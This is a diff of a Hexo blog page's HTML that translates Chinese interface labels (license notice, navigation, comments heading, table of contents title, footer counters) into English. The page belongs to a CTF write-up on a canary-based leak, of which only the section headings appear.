+            <strong>Link:</strong> https://redefine.ohevan.com/2024/09/16/wdb2018-guess-canary报错利用/
         </li>
         <li>
             <strong>
-                版权声明:
+                License:
             </strong>
             
 
             
-                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
             
         </li>
     </ul>
@@ -424,7 +424,7 @@
                             </span>
                             <span class="title flex justify-center items-center">
                                 <span class="post-nav-title-item">极客大挑战_2019-Not_Bad</span>
-                                <span class="post-nav-item">上一篇</span>
+                                <span class="post-nav-item">Prev posts</span>
                             </span>
                         </a>
                     </div>
@@ -437,7 +437,7 @@
                         >
                             <span class="title flex justify-center items-center">
                                 <span class="post-nav-title-item">记第一次awd测试</span>
-                                <span class="post-nav-item">下一篇</span>
+                                <span class="post-nav-item">Next posts</span>
                             </span>
                             <span class="right arrow-icon flex justify-center items-center">
                                 <i class="fa-solid fa-chevron-right"></i>
@@ -454,7 +454,7 @@
                 <div class="comments-container mt-10 w-full ">
     <div id="comment-anchor" class="w-full h-2.5"></div>
     <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
-        评论
+        Comments
     </div>
     
 
@@ -499,7 +499,7 @@
         <div class="toc-content-container">
             <div class="post-toc-wrap">
     <div class="post-toc">
-        <div class="toc-title">目录</div>
+        <div class="toc-title">On this page</div>
         <div class="page-title">wdb2018_guess--canary报错利用</div>
         <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9argv-0-%E4%BD%BFcanary%E6%8A%A5%E9%94%99%E6%97%B6%E6%B3%84%E9%9C%B2%E4%BF%A1%E6%81%AF"><span class="nav-text">修改argv[0],使canary报错时泄露信息</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-ida%E9%80%9F%E8%A7%88"><span class="nav-text">1.ida速览</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-gdb%E8%B0%83%E8%AF%95"><span class="nav-text">2.gdb调试</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E6%B3%84%E9%9C%B2Libc%EF%BC%9A"><span class="nav-text">(1) 泄露Libc：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E9%80%9A%E8%BF%87-environ%E6%B3%84%E9%9C%B2%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%9C%B0%E5%9D%80"><span class="nav-text">(2)通过__environ泄露环境变量地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E6%B3%84%E9%9C%B2flag"><span class="nav-text">(3),泄露flag</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E6%9C%80%E7%BB%88EXP"><span class="nav-text">3.最终EXP</span></a></li></ol></li></ol>
 
@@ -534,11 +534,11 @@
                 
                 <p class="post-count space-x-0.5">
                     <span>
-                        共撰写了 32 篇文章
+                        32 posts in total
                     </span>
                     
                         <span>
-                            共 32.8k 字
+                            32.9k words in total
                         </span>
                     
                 </p>
@@ -549,26 +549,26 @@
             <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                 
                     <span id="busuanzi_container_site_uv" class="lg:!block">
-                        <span class="text-sm">访问人数</span>
+                        <span class="text-sm">VISITOR COUNT</span>
                         <span id="busuanzi_value_site_uv"></span>
                     </span>
                 
                 
                     <span id="busuanzi_container_site_pv" class="lg:!block">
-                        <span class="text-sm">总访问量</span>
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                         <span id="busuanzi_value_site_pv"></span>
                     </span>
                 
             </div>
         
         <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
-            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
-            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.7.3</a></span>
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.7.3</a></span>
         </div>
         
         
             <div>
-                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
             </div>
         
         
